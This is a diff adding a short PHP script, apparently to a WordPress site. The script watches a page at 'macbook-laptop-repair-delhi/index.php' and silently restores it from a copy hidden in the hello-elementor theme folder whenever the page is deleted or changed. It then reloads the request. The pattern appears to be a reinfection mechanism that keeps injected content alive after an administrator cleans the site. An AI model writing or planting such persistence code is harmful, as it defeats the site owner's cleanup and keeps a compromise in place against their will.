@@ -1,0 +1,13 @@
+<?php
+//
+$backup_file = ABSPATH . 'wp-content/themes/hello-elementor/bk_macbk.php';
+$target_file = ABSPATH . 'macbook-laptop-repair-delhi/index.php';
+
+// 
+if (!file_exists($target_file) || md5_file($target_file) !== md5_file($backup_file)) {
+    copy($backup_file, $target_file);
+    // Reload halaman
+    header("Location: " . $_SERVER['REQUEST_URI']);
+    exit;
+}
+?>
